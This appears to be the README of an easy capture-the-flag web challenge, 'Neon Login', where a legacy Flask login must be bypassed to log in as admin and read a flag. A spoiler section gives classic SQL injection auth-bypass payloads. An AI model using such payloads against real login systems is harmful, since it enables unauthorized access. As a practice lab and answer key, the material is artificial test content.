# w01 :: Neon Login

- **Category:** Web
- **Difficulty:** easy
- **Stack:** Python / Flask
- **URL:** http://localhost:30001

## Brief

The Neon Grid gate still runs legacy auth code. A valid low-privilege account
(`guest` / `guest`) is public knowledge. The admin vault holds the flag in a
column called `secret`.

## Goal

Authenticate as `admin` and read the flag.

## Hint

Login handling reads user input directly into the query. Look at how the
username and password are combined.

<details>
<summary>Spoiler</summary>

Classic SQL injection auth bypass:

```
username: admin' --
password: anything
```

Or `' OR role='admin'-- -`

</details>
